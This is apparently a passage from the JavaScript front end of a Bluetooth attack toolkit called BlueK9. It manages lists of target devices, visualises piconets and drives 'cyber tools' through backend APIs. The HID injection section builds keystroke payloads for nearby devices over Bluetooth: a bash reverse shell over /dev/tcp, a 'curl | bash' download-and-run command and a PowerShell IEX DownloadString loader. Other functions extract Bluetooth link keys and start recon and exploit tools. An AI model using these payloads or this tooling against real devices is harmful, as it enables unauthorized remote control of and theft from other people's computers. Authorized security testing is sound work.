        source: d.source,
        target: d.target,
        type: d.type,
        confidence: d.confidence,
        reasons: d.reasons
    }));

    // Create nodes
    const nodes = data.nodes.map(d => ({
        id: d.id,
        name: d.name,
        type: d.type,
        role: d.role,
        manufacturer: d.manufacturer,
        rssi: d.rssi,
        is_target: d.is_target
    }));

    // Create simulation
    if (piconetSimulation) {
        piconetSimulation.stop();
    }

    piconetSimulation = d3.forceSimulation(nodes)
        .force('link', d3.forceLink(links).id(d => d.id).distance(100))
        .force('charge', d3.forceManyBody().strength(-300))
        .force('center', d3.forceCenter(width / 2, height / 2))
        .force('collision', d3.forceCollide().radius(40));

    // Draw links
    const link = svg.append('g')
        .selectAll('line')
        .data(links)
        .join('line')
        .attr('class', d => `piconet-link ${d.type}`)
        .attr('stroke-width', d => Math.max(1, d.confidence / 30));

    // Draw nodes
    const node = svg.append('g')
        .selectAll('g')
        .data(nodes)
        .join('g')
        .attr('class', d => `piconet-node ${d.is_target ? 'target' : ''}`)
        .call(d3.drag()
            .on('start', dragstarted)
            .on('drag', dragged)
            .on('end', dragended));

    // Node circles
    node.append('circle')
        .attr('r', d => d.is_target ? 14 : 10)
        .attr('fill', d => d.is_target ? '#ff3b30' : roleColors[d.role] || roleColors.unknown);

    // Node labels (shortened BD address)
    node.append('text')
        .attr('dy', 20)
        .attr('text-anchor', 'middle')
        .text(d => {
            if (d.name && d.name !== 'Unknown') {
                return d.name.substring(0, 12) + (d.name.length > 12 ? '...' : '');
            }
            return d.id.substring(0, 8);
        });

    // Tooltip
    const tooltip = document.getElementById('piconetTooltip');

    node.on('mouseover', function(event, d) {
        const relatedEdges = links.filter(l =>
            l.source.id === d.id || l.target.id === d.id
        );

        let tooltipHtml = `
            <div class="tooltip-title">${d.name || 'Unknown'}</div>
            <div class="tooltip-row"><span class="tooltip-label">Address:</span><span>${d.id}</span></div>
            <div class="tooltip-row"><span class="tooltip-label">Type:</span><span>${d.type}</span></div>
            <div class="tooltip-row"><span class="tooltip-label">Role:</span><span>${d.role}</span></div>
            <div class="tooltip-row"><span class="tooltip-label">Manufacturer:</span><span>${d.manufacturer || 'Unknown'}</span></div>
            ${d.rssi ? `<div class="tooltip-row"><span class="tooltip-label">RSSI:</span><span>${d.rssi} dBm</span></div>` : ''}
            ${d.is_target ? '<div style="color: #ff3b30; margin-top: 4px;">TARGET</div>' : ''}
        `;

        if (relatedEdges.length > 0) {
            tooltipHtml += '<div style="margin-top: 8px; border-top: 1px solid #333; padding-top: 4px;">';
            tooltipHtml += '<span class="tooltip-label">Relationships:</span>';
            relatedEdges.forEach(edge => {
                const other = edge.source.id === d.id ? edge.target : edge.source;
                tooltipHtml += `<div style="margin-top: 2px;">→ ${other.name || other.id.substring(0, 8)} (${edge.confidence}%)</div>`;
            });
            tooltipHtml += '</div>';
        }

        tooltip.innerHTML = tooltipHtml;
        tooltip.classList.remove('hidden');
        tooltip.style.left = (event.pageX + 10) + 'px';
        tooltip.style.top = (event.pageY - 10) + 'px';
    })
    .on('mousemove', function(event) {
        tooltip.style.left = (event.pageX + 10) + 'px';
        tooltip.style.top = (event.pageY - 10) + 'px';
    })
    .on('mouseout', function() {
        tooltip.classList.add('hidden');
    })
    .on('click', function(event, d) {
        // Open device info on click
        showDeviceInfo(d.id);
    });

    // Link tooltip
    link.on('mouseover', function(event, d) {
        let tooltipHtml = `
            <div class="tooltip-title">Relationship</div>
            <div class="tooltip-row"><span class="tooltip-label">Type:</span><span>${d.type}</span></div>
            <div class="tooltip-row"><span class="tooltip-label">Confidence:</span><span>${d.confidence}%</span></div>
            <div style="margin-top: 4px;"><span class="tooltip-label">Reasons:</span></div>
        `;
        d.reasons.forEach(reason => {
            tooltipHtml += `<div style="margin-left: 8px;">• ${reason}</div>`;
        });

        tooltip.innerHTML = tooltipHtml;
        tooltip.classList.remove('hidden');
        tooltip.style.left = (event.pageX + 10) + 'px';
        tooltip.style.top = (event.pageY - 10) + 'px';
    })
    .on('mouseout', function() {
        tooltip.classList.add('hidden');
    });

    // Update positions on tick
    piconetSimulation.on('tick', () => {
        link
            .attr('x1', d => d.source.x)
            .attr('y1', d => d.source.y)
            .attr('x2', d => d.target.x)
            .attr('y2', d => d.target.y);

        node.attr('transform', d => `translate(${d.x},${d.y})`);
    });

    // Drag functions
    function dragstarted(event, d) {
        if (!event.active) piconetSimulation.alphaTarget(0.3).restart();
        d.fx = d.x;
        d.fy = d.y;
    }

    function dragged(event, d) {
        d.fx = event.x;
        d.fy = event.y;
    }

    function dragended(event, d) {
        if (!event.active) piconetSimulation.alphaTarget(0);
        d.fx = null;
        d.fy = null;
    }

    // Add zoom behavior
    const zoom = d3.zoom()
        .scaleExtent([0.3, 3])
        .on('zoom', (event) => {
            svg.selectAll('g').attr('transform', event.transform);
        });

    svg.call(zoom);
}

// ==================== TARGETS MODAL ====================

/**
 * Open the Targets modal
 */
function openTargetsModal() {
    document.getElementById('targetsModal').classList.remove('hidden');
    refreshModalTargetList();
}

/**
 * Close the Targets modal
 */
function closeTargetsModal() {
    document.getElementById('targetsModal').classList.add('hidden');
}

/**
 * Add target from modal form
 */
function addTargetFromModal() {
    const bdAddressInput = document.getElementById('modalTargetBdAddress');
    const aliasInput = document.getElementById('modalTargetAlias');

    const bdAddress = bdAddressInput.value.trim().toUpperCase();
    const alias = aliasInput.value.trim();

    if (!bdAddress || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bdAddress)) {
        addLogEntry('Invalid BD address format. Use XX:XX:XX:XX:XX:XX', 'WARNING');
        return;
    }

    fetch('/api/targets', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ bd_address: bdAddress, alias: alias || null })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'added') {
            targets[bdAddress] = { alias: alias || null };
            addLogEntry(`Target added: ${bdAddress}${alias ? ' (' + alias + ')' : ''}`, 'INFO');
            bdAddressInput.value = '';
            aliasInput.value = '';
            refreshModalTargetList();
            updateQuickTargetList();
            updateDeviceTable();
        } else {
            addLogEntry(data.error || 'Failed to add target', 'ERROR');
        }
    })
    .catch(e => addLogEntry(`Error adding target: ${e}`, 'ERROR'));
}

/**
 * Refresh the target list in the modal
 */
function refreshModalTargetList() {
    const listContainer = document.getElementById('modalTargetList');
    const countEl = document.getElementById('modalTargetCount');
    const countBadge = document.getElementById('targetCountBadge');

    const targetKeys = Object.keys(targets);

    if (countEl) countEl.textContent = targetKeys.length;
    if (countBadge) countBadge.textContent = targetKeys.length;

    if (!listContainer) return;

    if (targetKeys.length === 0) {
        listContainer.innerHTML = '<div class="targets-empty">No targets configured</div>';
        return;
    }

    listContainer.innerHTML = '';
    targetKeys.forEach(bdAddress => {
        const target = targets[bdAddress];
        const device = devices[bdAddress] || {};
        const alias = target.alias || target.name || '';
        const deviceName = device.device_name || '';
        const lastSeen = device.last_seen ? formatDateTimeInTimezone(device.last_seen) : 'Never seen';
        const rssi = device.rssi ? `${device.rssi} dBm` : '--';

        const item = document.createElement('div');
        item.className = 'target-item';
        item.innerHTML = `
            <div class="target-item-main">
                <div class="target-item-bd">${bdAddress}</div>
                <div class="target-item-info">
                    ${alias ? `<span class="target-alias">${alias}</span>` : ''}
                    ${deviceName ? `<span class="target-name">${deviceName}</span>` : ''}
                </div>
            </div>
            <div class="target-item-stats">
                <span class="target-rssi">${rssi}</span>
                <span class="target-seen">${lastSeen}</span>
            </div>
            <div class="target-item-actions">
                <button class="btn btn-sm btn-danger" onclick="removeTarget('${bdAddress}')" title="Remove">
                    &#10005;
                </button>
            </div>
        `;

        // Right-click context menu for targets
        item.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            showTargetContextMenu(e, bdAddress);
        });

        listContainer.appendChild(item);
    });
}

/**
 * Update the quick target list in the left panel
 */
function updateQuickTargetList() {
    const listContainer = document.getElementById('quickTargetList');
    const countBadge = document.getElementById('targetCountBadge');

    const targetKeys = Object.keys(targets);

    if (countBadge) countBadge.textContent = targetKeys.length;

    if (!listContainer) return;

    if (targetKeys.length === 0) {
        listContainer.innerHTML = '<div class="no-targets-hint">No targets configured</div>';
        return;
    }

    // Show up to 5 targets in quick view
    const displayTargets = targetKeys.slice(0, 5);
    listContainer.innerHTML = '';

    displayTargets.forEach(bdAddress => {
        const target = targets[bdAddress];
        const device = devices[bdAddress] || {};
        const alias = target.alias || target.name || '';
        const shortBd = bdAddress.substring(0, 8) + '...';

        const item = document.createElement('div');
        item.className = 'quick-target-item';
        item.onclick = () => focusOnDevice(bdAddress);
        item.innerHTML = `
            <span class="quick-target-icon">&#127919;</span>
            <span class="quick-target-bd">${alias || shortBd}</span>
            <span class="quick-target-rssi">${device.rssi ? device.rssi + ' dBm' : '--'}</span>
        `;

        // Right-click context menu for quick targets
        item.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            showTargetContextMenu(e, bdAddress);
        });

        listContainer.appendChild(item);
    });

    if (targetKeys.length > 5) {
        const more = document.createElement('div');
        more.className = 'quick-target-more';
        more.textContent = `+${targetKeys.length - 5} more...`;
        more.onclick = openTargetsModal;
        listContainer.appendChild(more);
    }
}

/**
 * Clear all targets
 */
function clearAllTargets() {
    if (!confirm('Remove all targets? This action cannot be undone.')) return;

    const targetKeys = Object.keys(targets);
    let cleared = 0;

    targetKeys.forEach(bdAddress => {
        fetch(`/api/targets/${encodeURIComponent(bdAddress)}`, { method: 'DELETE' })
            .then(r => r.json())
            .then(data => {
                if (data.status === 'deleted') {
                    delete targets[bdAddress];
                    cleared++;
                    if (cleared === targetKeys.length) {
                        addLogEntry(`Cleared ${cleared} targets`, 'INFO');
                        refreshModalTargetList();
                        updateQuickTargetList();
                        updateDeviceTable();
                    }
                }
            })
            .catch(() => {});
    });
}

/**
 * Export targets to JSON file
 */
function exportTargets() {
    const targetData = Object.entries(targets).map(([bd, data]) => ({
        bd_address: bd,
        alias: data.alias || data.name || null
    }));

    const blob = new Blob([JSON.stringify(targetData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `bluek9_targets_${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(url);

    addLogEntry(`Exported ${targetData.length} targets`, 'INFO');
}

/**
 * Import targets from file
 */
function importTargets(event) {
    const file = event.target.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (e) => {
        try {
            let importedTargets = [];

            if (file.name.endsWith('.json')) {
                importedTargets = JSON.parse(e.target.result);
            } else if (file.name.endsWith('.csv') || file.name.endsWith('.txt')) {
                // Parse as CSV/text: one BD address per line, optional comma-separated alias
                const lines = e.target.result.split('\n');
                lines.forEach(line => {
                    line = line.trim();
                    if (!line || line.startsWith('#')) return;
                    const parts = line.split(',');
                    const bd = parts[0].trim().toUpperCase();
                    if (/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bd)) {
                        importedTargets.push({
                            bd_address: bd,
                            alias: parts[1] ? parts[1].trim() : null
                        });
                    }
                });
            }

            if (importedTargets.length === 0) {
                addLogEntry('No valid targets found in file', 'WARNING');
                return;
            }

            // Add each target
            let added = 0;
            importedTargets.forEach(t => {
                if (targets[t.bd_address]) return; // Skip existing

                fetch('/api/targets', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(t)
                })
                .then(r => r.json())
                .then(data => {
                    if (data.status === 'added') {
                        targets[t.bd_address] = { alias: t.alias };
                        added++;
                    }
                })
                .finally(() => {
                    if (added > 0) {
                        refreshModalTargetList();
                        updateQuickTargetList();
                        updateDeviceTable();
                    }
                });
            });

            addLogEntry(`Importing ${importedTargets.length} targets...`, 'INFO');

        } catch (err) {
            addLogEntry(`Failed to parse import file: ${err}`, 'ERROR');
        }
    };
    reader.readAsText(file);

    // Reset file input
    event.target.value = '';
}

// Update refreshTargetList to also update quick view and modal
const originalRefreshTargetList = typeof refreshTargetList === 'function' ? refreshTargetList : null;
function refreshTargetListExtended() {
    if (originalRefreshTargetList) originalRefreshTargetList();
    updateQuickTargetList();
    refreshModalTargetList();
}

// Override refreshTargetList if it exists
if (originalRefreshTargetList) {
    refreshTargetList = refreshTargetListExtended;
}

// Initialize quick target list on load
document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
        updateQuickTargetList();
    }, 1500);
});

// ==================== CYBER TOOLS ====================

let hidInjectionActive = false;
let hidInjectionPollInterval = null;

/**
 * Check HID tool installation status
 */
function checkHidToolStatus() {
    fetch('/api/cyber/hid/status')
        .then(r => r.json())
        .then(data => {
            const toolStatus = document.getElementById('hidToolInstalled');
            const adapterStatus = document.getElementById('hidAdapterStatus');

            if (data.installed) {
                toolStatus.textContent = 'Installed';
                toolStatus.className = 'status-value installed';
            } else {
                toolStatus.textContent = 'Not Installed';
                toolStatus.className = 'status-value not-installed';
            }

            if (data.adapter) {
                adapterStatus.textContent = data.adapter.name || 'Available';
                adapterStatus.className = 'status-value installed';
            } else {
                adapterStatus.textContent = 'No compatible adapter';
                adapterStatus.className = 'status-value error';
            }
        })
        .catch(e => {
            document.getElementById('hidToolInstalled').textContent = 'Error checking';
            document.getElementById('hidToolInstalled').className = 'status-value error';
        });
}

/**
 * Setup/install the HID injection tool
 */
function setupHidTool() {
    addLogEntry('Setting up HID injection tool...', 'INFO');
    addHidLog('info', 'Cloning hi_my_name_is_keyboard repository...');

    const resultsDiv = document.getElementById('hidResults');
    resultsDiv.classList.remove('hidden');

    fetch('/api/cyber/hid/setup', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'success') {
                addHidLog('success', 'Tool installed successfully');
                addLogEntry('HID injection tool installed', 'INFO');
                checkHidToolStatus();
            } else {
                addHidLog('error', data.error || 'Setup failed');
                addLogEntry('HID tool setup failed: ' + (data.error || 'Unknown error'), 'ERROR');
            }
        })
        .catch(e => {
            addHidLog('error', 'Setup failed: ' + e);
            addLogEntry('HID tool setup error: ' + e, 'ERROR');
        });
}

/**
 * Fill HID target from selected survey device
 */
function fillHidTargetFromSurvey() {
    const selected = document.getElementById('selectedDevice').textContent;
    if (selected && selected !== 'NONE') {
        document.getElementById('hidTargetAddress').value = selected;
    } else {
        addLogEntry('Select a device from the survey table first', 'WARNING');
    }
}

/**
 * Update payload preview based on selected type
 */
function updateHidPayloadPreview() {
    const payloadType = document.getElementById('hidPayloadType').value;
    const customRow = document.getElementById('hidCustomPayloadRow');
    const revshellRow = document.getElementById('hidRevshellOptions');
    const downloadRow = document.getElementById('hidDownloadOptions');
    const payloadText = document.getElementById('hidPayloadText');

    // Hide all optional rows first
    revshellRow.classList.add('hidden');
    downloadRow.classList.add('hidden');
    customRow.classList.remove('hidden');

    switch (payloadType) {
        case 'hello':
            payloadText.value = 'Hello World! This is a test from BlueK9.';
            payloadText.disabled = true;
            break;
        case 'revshell_linux':
        case 'revshell_macos':
            customRow.classList.add('hidden');
            revshellRow.classList.remove('hidden');
            payloadText.disabled = true;
            break;
        case 'download_exec':
            customRow.classList.add('hidden');
            downloadRow.classList.remove('hidden');
            payloadText.disabled = true;
            break;
        case 'custom':
        default:
            payloadText.value = '';
            payloadText.disabled = false;
            break;
    }
}

/**
 * Build the payload based on selected options
 */
function buildHidPayload() {
    const payloadType = document.getElementById('hidPayloadType').value;
    const platform = document.getElementById('hidTargetPlatform').value;

    switch (payloadType) {
        case 'hello':
            return 'Hello World! This is a test from BlueK9.';
        case 'revshell_linux':
            const lhostLinux = document.getElementById('hidLhost').value || '127.0.0.1';
            const lportLinux = document.getElementById('hidLport').value || '4444';
            return `bash -i >& /dev/tcp/${lhostLinux}/${lportLinux} 0>&1`;
        case 'revshell_macos':
            const lhostMac = document.getElementById('hidLhost').value || '127.0.0.1';
            const lportMac = document.getElementById('hidLport').value || '4444';
            return `bash -i >& /dev/tcp/${lhostMac}/${lportMac} 0>&1`;
        case 'download_exec':
            const url = document.getElementById('hidDownloadUrl').value || 'http://127.0.0.1/payload.sh';
            if (platform === 'linux' || platform === 'macos') {
                return `curl -s ${url} | bash`;
            } else if (platform === 'windows') {
                return `powershell -c "IEX(New-Object Net.WebClient).DownloadString('${url}')"`;
            }
            return `curl -s ${url} | bash`;
        case 'custom':
        default:
            return document.getElementById('hidPayloadText').value;
    }
}

/**
 * Start HID keystroke injection
 */
function startHidInjection() {
    const targetAddress = document.getElementById('hidTargetAddress').value.trim().toUpperCase();
    const platform = document.getElementById('hidTargetPlatform').value;
    const payload = buildHidPayload();

    if (!targetAddress || !targetAddress.match(/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/)) {
        addLogEntry('Invalid target address format', 'WARNING');
        return;
    }

    if (!payload) {
        addLogEntry('Payload cannot be empty', 'WARNING');
        return;
    }

    addLogEntry(`Starting HID injection to ${targetAddress} (${platform})...`, 'INFO');
    addHidLog('info', `Target: ${targetAddress}, Platform: ${platform}`);
    addHidLog('info', `Payload: ${payload.substring(0, 50)}${payload.length > 50 ? '...' : ''}`);

    // Show results panel
    document.getElementById('hidResults').classList.remove('hidden');

    // Update button states
    document.getElementById('btnHidInject').disabled = true;
    document.getElementById('btnHidStop').disabled = false;
    hidInjectionActive = true;

    // Add to active operations
    addOperation('hid-injection', 'HID', 'Keystroke Injection', {
        bdAddress: targetAddress,
        cancellable: true,
        cancelFn: stopHidInjection
    });

    fetch('/api/cyber/hid/inject', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            target: targetAddress,
            platform: platform,
            payload: payload
        })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started') {
            addHidLog('info', 'Injection started, attempting pairing...');
            // Start polling for status
            hidInjectionPollInterval = setInterval(pollHidStatus, 1000);
        } else {
            addHidLog('error', data.error || 'Failed to start injection');
            stopHidInjection();
        }
    })
    .catch(e => {
        addHidLog('error', 'Injection failed: ' + e);
        stopHidInjection();
    });
}

/**
 * Poll HID injection status
 */
function pollHidStatus() {
    fetch('/api/cyber/hid/status')
        .then(r => r.json())
        .then(data => {
            if (data.injection_status) {
                if (data.injection_status.state === 'running') {
                    if (data.injection_status.message) {
                        addHidLog('info', data.injection_status.message);
                    }
                } else if (data.injection_status.state === 'complete') {
                    addHidLog('success', 'Injection completed successfully');
                    addLogEntry('HID injection completed', 'INFO');
                    stopHidInjection();
                } else if (data.injection_status.state === 'error') {
                    addHidLog('error', data.injection_status.error || 'Injection failed');
                    stopHidInjection();
                }
            }
        })
        .catch(e => {
            console.log('Status poll error:', e);
        });
}

/**
 * Stop HID injection
 */
function stopHidInjection() {
    hidInjectionActive = false;

    if (hidInjectionPollInterval) {
        clearInterval(hidInjectionPollInterval);
        hidInjectionPollInterval = null;
    }

    fetch('/api/cyber/hid/stop', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            addHidLog('info', 'Injection stopped');
        })
        .catch(e => {
            console.log('Stop error:', e);
        });

    // Update button states
    document.getElementById('btnHidInject').disabled = false;
    document.getElementById('btnHidStop').disabled = true;

    // Remove from active operations
    removeOperation('hid-injection');
}

/**
 * Add entry to HID injection log
 */
function addHidLog(type, message) {
    const log = document.getElementById('hidResultsLog');
    const entry = document.createElement('div');
    entry.className = `hid-log-entry ${type}`;

    const time = new Date().toLocaleTimeString();
    entry.innerHTML = `<span class="log-time">[${time}]</span><span class="log-message">${message}</span>`;

    log.appendChild(entry);
    log.scrollTop = log.scrollHeight;
}

/**
 * Extract Bluetooth link key
 */
function extractLinkKey() {
    const method = document.getElementById('linkKeyMethod').value;
    const targetAddress = document.getElementById('linkKeyTargetAddress').value.trim().toUpperCase();

    if (!targetAddress || !targetAddress.match(/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/)) {
        addLogEntry('Invalid target address format', 'WARNING');
        return;
    }

    addLogEntry(`Attempting link key extraction via ${method}...`, 'INFO');

    const resultsDiv = document.getElementById('linkKeyResults');
    const resultsContent = document.getElementById('linkKeyResultsContent');
    resultsDiv.classList.remove('hidden');
    resultsContent.innerHTML = '<div class="loading-text">Attempting extraction...</div>';

    fetch('/api/cyber/linkkey/extract', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            target: targetAddress,
            method: method
        })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success' && data.link_key) {
            resultsContent.innerHTML = `
                <div class="linkkey-result">
                    <div class="linkkey-label">Target Address</div>
                    <div class="linkkey-value">${targetAddress}</div>
                </div>
                <div class="linkkey-result">
                    <div class="linkkey-label">Link Key</div>
                    <div class="linkkey-value">${data.link_key}</div>
                </div>
                ${data.key_type ? `
                <div class="linkkey-result">
                    <div class="linkkey-label">Key Type</div>
                    <div class="linkkey-value">${data.key_type}</div>
                </div>
                ` : ''}
            `;
            addLogEntry('Link key extracted successfully', 'INFO');
        } else {
            resultsContent.innerHTML = `<div class="error-text">${data.error || 'Extraction failed'}</div>`;
            addLogEntry('Link key extraction failed: ' + (data.error || 'Unknown error'), 'ERROR');
        }
    })
    .catch(e => {
        resultsContent.innerHTML = `<div class="error-text">Extraction failed: ${e}</div>`;
        addLogEntry('Link key extraction error: ' + e, 'ERROR');
    });
}

// ==================== CYBER TOOLS ARSENAL ====================

/**
 * Show a cyber tools category
 */
function showCyberCategory(category) {
    // Hide all categories
    document.querySelectorAll('.cyber-category').forEach(el => {
        el.classList.remove('active');
    });

    // Deactivate all nav buttons
    document.querySelectorAll('.cyber-nav-btn').forEach(btn => {
        btn.classList.remove('active');
    });

    // Show selected category
    const categoryMap = {
        'recon': 'cyberRecon',
        'sniff': 'cyberSniff',
        'exploit': 'cyberExploit',
        'mitm': 'cyberMitm',
        'inject': 'cyberInject',
        'firmware': 'cyberFirmware',
        'utils': 'cyberUtils'
    };

    const categoryId = categoryMap[category];
    if (categoryId) {
        const el = document.getElementById(categoryId);
        if (el) el.classList.add('active');
    }

    // Activate nav button
    const navBtn = document.querySelector(`.cyber-nav-btn[data-category="${category}"]`);
    if (navBtn) navBtn.classList.add('active');
}

/**
 * Toggle cyber tool card expansion
 */
function toggleToolCard(headerEl) {
    const card = headerEl.closest('.cyber-tool-card');
    const isExpanded = card.classList.contains('expanded');

    // Optionally collapse others
    // document.querySelectorAll('.cyber-tool-card.expanded').forEach(c => c.classList.remove('expanded'));

    if (isExpanded) {
        card.classList.remove('expanded');
        headerEl.classList.remove('expanded');
    } else {
        card.classList.add('expanded');
        headerEl.classList.add('expanded');
    }
}

/**
 * Fill target input from survey selection
 */
function fillFromSurvey(inputId) {
    // Get selected device from survey table
    const selectedRow = document.querySelector('#deviceTableBody tr.selected');
    if (selectedRow) {
        const bdAddr = selectedRow.querySelector('td:first-child')?.textContent?.trim();
        if (bdAddr) {
            document.getElementById(inputId).value = bdAddr;
            return;
        }
    }

    // Fallback - try to get from a targeted device
    const targetRow = document.querySelector('#deviceTableBody tr.target-row');
    if (targetRow) {
        const bdAddr = targetRow.querySelector('td:first-child')?.textContent?.trim();
        if (bdAddr) {
            document.getElementById(inputId).value = bdAddr;
            return;
        }
    }

    addLogEntry('No device selected in survey', 'WARNING');
}

/**
 * Check status of all cyber tools
 */
function checkCyberToolsStatus() {
    fetch('/api/cyber/tools/status')
        .then(r => r.json())
        .then(data => {
            const statusDot = document.getElementById('cyberToolsStatusDot');
            const statusText = document.getElementById('cyberToolsStatusText');

            if (data.status === 'ready') {
                statusDot.className = 'status-dot ready';
                statusText.textContent = `${data.installed_count}/${data.total_count} tools installed`;
            } else if (data.status === 'partial') {
                statusDot.className = 'status-dot warning';
                statusText.textContent = `${data.installed_count}/${data.total_count} tools installed`;
            } else {
                statusDot.className = 'status-dot error';
                statusText.textContent = 'Tools not installed';
            }

            // Update individual tool statuses
            if (data.tools) {
                Object.entries(data.tools).forEach(([tool, installed]) => {
                    const statusEl = document.getElementById(`${tool}Status`);
                    if (statusEl) {
                        statusEl.textContent = installed ? 'Installed' : 'Not Found';
                        statusEl.className = `tool-status ${installed ? 'installed' : 'missing'}`;
                    }
                });
            }
        })
        .catch(e => {
            console.error('Failed to check cyber tools status:', e);
            const statusDot = document.getElementById('cyberToolsStatusDot');
            const statusText = document.getElementById('cyberToolsStatusText');
            statusDot.className = 'status-dot';
            statusText.textContent = 'Status check failed';
        });

    // Also check HID tool
    checkHidToolStatus();
}

/**
 * Install a cyber tool with visual feedback
 */
function installTool(toolName, button = null) {
    // Find the install button if not passed
    if (!button) {
        button = document.querySelector(`button[onclick*="installTool('${toolName}')"]`);
    }

    // Store original button state
    const originalHtml = button ? button.innerHTML : '';
    const originalDisabled = button ? button.disabled : false;

    // Show loading state on button
    if (button) {
        button.disabled = true;
        button.innerHTML = '<span class="spinner"></span> Installing...';
        button.classList.add('installing');
    }

    // Update status banner
    const statusText = document.getElementById('cyberToolsStatusText');
    const statusDot = document.getElementById('cyberToolsStatusDot');
    if (statusText) {
        statusText.textContent = `Installing ${toolName}...`;
    }
    if (statusDot) {
        statusDot.className = 'status-dot installing';
    }

    addLogEntry(`Installing ${toolName}...`, 'INFO');

    fetch('/api/cyber/tools/install', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ tool: toolName })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success') {
            addLogEntry(`${toolName} installed successfully`, 'INFO');
            if (button) {
                button.innerHTML = '&#10003; Installed';
                button.classList.remove('installing');
                button.classList.add('btn-success');
                // Re-enable after 2 seconds
                setTimeout(() => {
                    button.innerHTML = originalHtml;
                    button.disabled = originalDisabled;
                    button.classList.remove('btn-success');
                }, 2000);
            }
        } else {
            addLogEntry(`Failed to install ${toolName}: ${data.error}`, 'ERROR');
            if (button) {
                button.innerHTML = '&#10007; Failed';
                button.classList.remove('installing');
                button.classList.add('btn-danger');
                setTimeout(() => {
                    button.innerHTML = originalHtml;
                    button.disabled = originalDisabled;
                    button.classList.remove('btn-danger');
                }, 3000);
            }
        }
        checkCyberToolsStatus();
    })
    .catch(e => {
        addLogEntry(`Install error: ${e}`, 'ERROR');
        if (button) {
            button.innerHTML = '&#10007; Error';
            button.classList.remove('installing');
            setTimeout(() => {
                button.innerHTML = originalHtml;
                button.disabled = originalDisabled;
            }, 3000);
        }
        checkCyberToolsStatus();
    });
}

/**
 * Install all uninstalled cyber tools
 */
function installAllTools() {
    const installAllBtn = document.getElementById('btnInstallAll');
    if (installAllBtn) {
        installAllBtn.disabled = true;
        installAllBtn.innerHTML = '<span class="spinner"></span> Installing All...';
    }

    const statusText = document.getElementById('cyberToolsStatusText');
    if (statusText) {
        statusText.textContent = 'Installing all tools...';
    }

    addLogEntry('Starting installation of all tools...', 'INFO');

    fetch('/api/cyber/tools/install-all', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'success' || data.status === 'partial') {
            const installed = data.installed || [];
            const failed = data.failed || [];

            if (installed.length > 0) {
                addLogEntry(`Successfully installed: ${installed.join(', ')}`, 'INFO');
            }
            if (failed.length > 0) {
                addLogEntry(`Failed to install: ${failed.map(f => f.tool).join(', ')}`, 'WARNING');
            }
            if (data.already_installed && data.already_installed.length > 0) {
                addLogEntry(`Already installed: ${data.already_installed.join(', ')}`, 'INFO');
            }
        } else {
            addLogEntry(`Install all failed: ${data.error}`, 'ERROR');
        }

        if (installAllBtn) {
            installAllBtn.disabled = false;
            installAllBtn.innerHTML = '&#128229; Install All';
        }
        checkCyberToolsStatus();
    })
    .catch(e => {
        addLogEntry(`Install all error: ${e}`, 'ERROR');
        if (installAllBtn) {
            installAllBtn.disabled = false;
            installAllBtn.innerHTML = '&#128229; Install All';
        }
        checkCyberToolsStatus();
    });
}

/**
 * Append output to a tool's output panel
 */
function appendToolOutput(outputId, text, type = 'info') {
    const outputEl = document.getElementById(outputId);
    if (!outputEl) return;

    outputEl.classList.remove('hidden');
    const content = outputEl.querySelector('.tool-output-content') || outputEl;

    const line = document.createElement('div');
    line.className = `tool-output-line ${type}`;
    line.textContent = text;
    content.appendChild(line);
    content.scrollTop = content.scrollHeight;
}

/**
 * Clear a tool's output panel
 */
function clearToolOutput(outputId) {
    const outputEl = document.getElementById(outputId);
    if (!outputEl) return;

    const content = outputEl.querySelector('.tool-output-content') || outputEl;
    content.innerHTML = '';
}

// ==================== RECON TOOLS ====================

/**
 * Start Blue Hydra
 */
function startBlueHydra() {
    const useUbertooth = document.getElementById('blueHydraUbertooth')?.checked;
    const passiveOnly = document.getElementById('blueHydraPassive')?.checked;

    clearToolOutput('blueHydraOutput');
    appendToolOutput('blueHydraOutput', 'Starting Blue Hydra...', 'info');

    fetch('/api/cyber/recon/blue_hydra/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ubertooth: useUbertooth, passive: passiveOnly })
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'started') {
            document.getElementById('btnStopBlueHydra').disabled = false;
            appendToolOutput('blueHydraOutput', 'Blue Hydra started', 'success');
        } else {
            appendToolOutput('blueHydraOutput', `Error: ${data.error}`, 'error');
        }
    })
    .catch(e => appendToolOutput('blueHydraOutput', `Error: ${e}`, 'error'));
}

function stopBlueHydra() {
    fetch('/api/cyber/recon/blue_hydra/stop', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            document.getElementById('btnStopBlueHydra').disabled = true;
            appendToolOutput('blueHydraOutput', 'Blue Hydra stopped', 'info');
        });
}

/**
 * Run BLESuite scan
 */
function runBLESuite() {
    const target = document.getElementById('blesuiteTarget')?.value?.trim();
    const scanType = document.getElementById('blesuiteScanType')?.value;

    if (!target) {
        addLogEntry('BLESuite requires a target address', 'WARNING');
        return;
    }

    clearToolOutput('blesuiteOutput');
    appendToolOutput('blesuiteOutput', `Running BLESuite ${scanType} on ${target}...`, 'info');

